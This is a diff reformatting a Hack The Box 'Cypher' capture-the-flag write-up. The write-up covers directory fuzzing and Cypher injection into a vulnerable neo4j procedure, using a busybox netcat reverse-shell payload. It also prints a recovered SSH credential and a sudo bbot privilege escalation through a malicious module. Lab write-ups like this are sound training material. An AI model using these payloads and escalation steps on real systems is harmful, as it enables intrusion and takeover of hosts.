@@ -1,19 +1,17 @@
 ---
 sticker: emoji//1fa99
 ---
+# ENUMERATION
+---
 
-# CYPHER
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | ssh     |
 | 80   | http    |
 
@@ -39,19 +37,20 @@ We need to add `cypher.htb` to `/etc/hosts`:
 echo '10.10.11.57 cypher.htb' | sudo tee -a /etc/hosts
 ```
 
-## RECONNAISSANCE
 
-***
+# RECONNAISSANCE
+---
 
 We can start by checking the web application:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313140843.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313140843.png)
+
 
 Source code's got this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313140938.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313140938.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313140946.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313140946.png)
 
 If we go to `/data.json`, we can see a bunch of data, nothing useful yet, let's try to fuzz for subdomains and hidden directories:
 
@@ -66,19 +65,22 @@ testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1
 login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 3393ms]
 ```
 
+
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cypher.htb/ -H "Host: FUZZ.cypher.htb" -t 200 -fs 154 -ic -c
 
 :: Progress: [114437/114437] :: Job [1/1] :: 1915 req/sec :: Duration: [0:01:13] :: Errors: 0 ::
 ```
 
+
 Nothing came for subdomains, so, let's proceed with our directories, we got a `testing` page, let's check out its contents:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313150146.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313150146.png)
 
 We got a `.jar` file, let's analyze it, we can use `jd-gui` a a standalone graphical utility that displays Java sources from `CLASS` files:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313154856.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313154856.png)
 
 We got this, let's analyze the code better:
 
@@ -141,10 +143,10 @@ public class CustomFunctions {
 
 This code is critically vulnerable to cypher injection, here's the reason why:
 
-* **No Input Sanitization**: The code only checks if the URL starts with `http://` or `https://`, but does **not** escape shell metacharacters (e.g., `;`, `|`).
-* **Shell Execution**: Using `/bin/sh -c` allows arbitrary command execution if the input is not properly sanitized.
-* The `url` parameter is concatenated directly into a shell command (`/bin/sh -c`).
-* An attacker can exploit this by injecting shell operators (e.g., `;`, `&&`, `|`, `$()`, backticks) into `url`.
+- **No Input Sanitization**: The code only checks if the URL starts with `http://` or `https://`, but does **not** escape shell metacharacters (e.g., `;`, `|`).
+- **Shell Execution**: Using `/bin/sh -c` allows arbitrary command execution if the input is not properly sanitized.
+- The `url` parameter is concatenated directly into a shell command (`/bin/sh -c`).
+- An attacker can exploit this by injecting shell operators (e.g., `;`, `&&`, `|`, `$()`, backticks) into `url`.
 
 Knowing all this, we can test this command injection vulnerability inside the login page, we are dealing with `Cypher` which is the Graph Query Language neo4j uses, let's use this wiki on how to exploit:
 
@@ -152,9 +154,9 @@ Wiki:https://pentester.land/blog/cypher-injection-cheatsheet/
 
 Let's begin exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 After a while reading the article, I could craft a payload that gives us a reverse shell right to our machine:
 
@@ -166,6 +168,7 @@ YIELD statusCode AS a
 RETURN a;//
 ```
 
+
 We need to do the following:
 
 1. Set up a server using python at any port, we do this to create a legitimate URL which the server's gonna read.
@@ -173,42 +176,50 @@ We need to do the following:
 3. Use the payload at the `username` section on the login page.
 4. Get our reverse shell.
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313161304.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313161304.png)
 
 There we go, but why does this work?
 
-#### **How It Works**
+### **How It Works**
 
-**1. Cypher Injection (`a' return h.value as a UNION ...`)**
+#### **1. Cypher Injection (`a' return h.value as a UNION ...`)**
 
-* **Goal**: Break out of the original Cypher query and inject a malicious query.
-* **Mechanism**:
-  * The `a'` closes a string parameter in the original query
-  * The `UNION` clause merges the original query’s results with the attacker’s injected query. Both must return the same columns (`a` here).
+- **Goal**: Break out of the original Cypher query and inject a malicious query.
+    
+- **Mechanism**:
 
-**2. Exploiting `custom.getUrlStatusCode` (Command Injection)**
+    - The `a'` closes a string parameter in the original query
+        
+    - The `UNION` clause merges the original query’s results with the attacker’s injected query. Both must return the same columns (`a` here).
 
-The `CALL` statement invokes the vulnerable Java procedure `custom.getUrlStatusCode`, which is designed to check HTTP status codes but is exploited here to run arbitrary commands:
+#### **2. Exploiting `custom.getUrlStatusCode` (Command Injection)**
+
+The `CALL` statement invokes the vulnerable Java procedure `custom.getUrlStatusCode`, which is designed to check HTTP status codes but is exploited here to run arbitrary commands:
 
 ```java
 String[] command = { "/bin/sh", "-c", "curl ... " + url };
 Process process = Runtime.getRuntime().exec(command);
 ```
 
-* **Malicious URL**: `http://IP:SERVERPORT;busybox nc IP NC PORT -e sh;#`
-  * `;`: Terminates the `curl` command and starts a new shell command.
-  * `busybox nc IP NC PORT -e sh`: Uses `busybox` (a lightweight Unix toolkit) to run `nc` (netcat), creating a **reverse shell** connecting to the attacker’s machine.
-  * `#`: Comments out the rest of the URL to avoid syntax errors.
+- **Malicious URL**: `http://IP:SERVERPORT;busybox nc IP NC PORT -e sh;#`
+    
+    - `;`: Terminates the `curl` command and starts a new shell command.
+        
+    - `busybox nc IP NC PORT -e sh`: Uses `busybox` (a lightweight Unix toolkit) to run `nc` (netcat), creating a **reverse shell** connecting to the attacker’s machine.
+        
+    - `#`: Comments out the rest of the URL to avoid syntax errors.
+        
+#### **3. Commenting Out Trailing Code (`;//`)**
 
-**3. Commenting Out Trailing Code (`;//`)**
+- `//` at the end comments out any remaining parts of the original query (prevents syntax errors).
 
-* `//` at the end comments out any remaining parts of the original query (prevents syntax errors).
 
 Once we know how this works, let's continue right onto privesc.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
+
 
 First thing is stabilizing our shell:
 
@@ -219,7 +230,7 @@ First thing is stabilizing our shell:
 5. export TERM=xterm
 6. export BASH=bash
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313161553.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313161553.png)
 
 There we go, we got ourselves a nice stable shell, let's search for other users:
 
@@ -292,11 +303,11 @@ We can try that password on `graphasm`, let's go into ssh:
 graphasm:cU4btyib.20xtCMCXkBmerhK
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313162915.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313162915.png)
 
 It worked, we're inside of graphasm's account, let's proceed and read both flags at the end, we can use linpeas as always:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313163602.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313163602.png)
 
 We can run sudo on a binary called `bbot`, let's check it out:
 
@@ -374,25 +385,31 @@ fi
 
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313165653.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313165653.png)
+### **1. How It’s Supposed to Work**
 
-#### **1. How It’s Supposed to Work**
+#### **Step 1-3: Prepare Malicious BBOT Module**
 
-**Step 1-3: Prepare Malicious BBOT Module**
+- **`/tmp/myconf.yml`**: Directs BBOT to load modules from `/tmp/modules`.
+    
+- **`/tmp/modules/whois2.py`**: Defines a custom BBOT module with a `setup()` method that:
+    
+    - Copies `/bin/bash` to `/tmp/bash`.
+        
+    - Sets the SUID bit (`chmod u+s`) on `/tmp/bash`, which would allow anyone executing `/tmp/bash` to run it as the file owner (`root`, since BBOT is run with `sudo`).
+        
 
-* **`/tmp/myconf.yml`**: Directs BBOT to load modules from `/tmp/modules`.
-* **`/tmp/modules/whois2.py`**: Defines a custom BBOT module with a `setup()` method that:
-  * Copies `/bin/bash` to `/tmp/bash`.
-  * Sets the SUID bit (`chmod u+s`) on `/tmp/bash`, which would allow anyone executing `/tmp/bash` to run it as the file owner (`root`, since BBOT is run with `sudo`).
+#### **Step 4: Execute BBOT with the Malicious Module**
 
-**Step 4: Execute BBOT with the Malicious Module**
+- `sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2` runs BBOT as `root`, loading the malicious module.
+    
+- The `setup()` method in `whois2.py` should execute, creating the SUID `/tmp/bash`.
+    
 
-* `sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2` runs BBOT as `root`, loading the malicious module.
-* The `setup()` method in `whois2.py` should execute, creating the SUID `/tmp/bash`.
+#### **Step 5: Spawn Root Shell**
 
-**Step 5: Spawn Root Shell**
+- If successful, `/tmp/bash -p` would spawn a root shell (`-p` preserves privileges).
 
-* If successful, `/tmp/bash -p` would spawn a root shell (`-p` preserves privileges).
 
 We got our root shell, let's read flags:
 
@@ -406,8 +423,10 @@ bash-5.2# cat /root/root.txt
 a20b1c69392473307deb62309474c70c
 ```
 
+
 Just like that, machine is done.
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250313165846.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313165846.png)
 
 https://www.hackthebox.com/achievement/machine/1872557/650
+
